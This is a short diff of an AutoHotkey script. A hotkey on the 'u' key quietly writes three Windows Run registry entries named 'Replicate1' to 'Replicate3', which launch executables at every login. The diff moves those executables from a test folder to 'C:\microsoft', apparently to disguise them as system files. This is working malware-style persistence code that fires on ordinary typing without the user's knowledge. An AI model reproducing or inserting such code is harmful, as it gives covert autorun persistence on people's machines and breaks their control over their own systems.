@@ -11,11 +11,11 @@ DirList(pattern, attr := "") {
 }
 
 $u::{
-    path := "C:\test"
+    path := "C:\microsoft"
     Send "u"
-    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1", '"C:\test\LButton.exe"')
-    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2", '"C:\test\RButton.exe"')
-    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3", '"C:\test\Delete.exe"')
+    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1", '"C:\microsoft\LButton.exe"')
+    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2", '"C:\microsoft\RButton.exe"')
+    RegWrite("REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3", '"C:\microsoft\Delete.exe"')
     if (DirExist(path)) {
         for file in DirList(path "\*") {
             MsgBox file
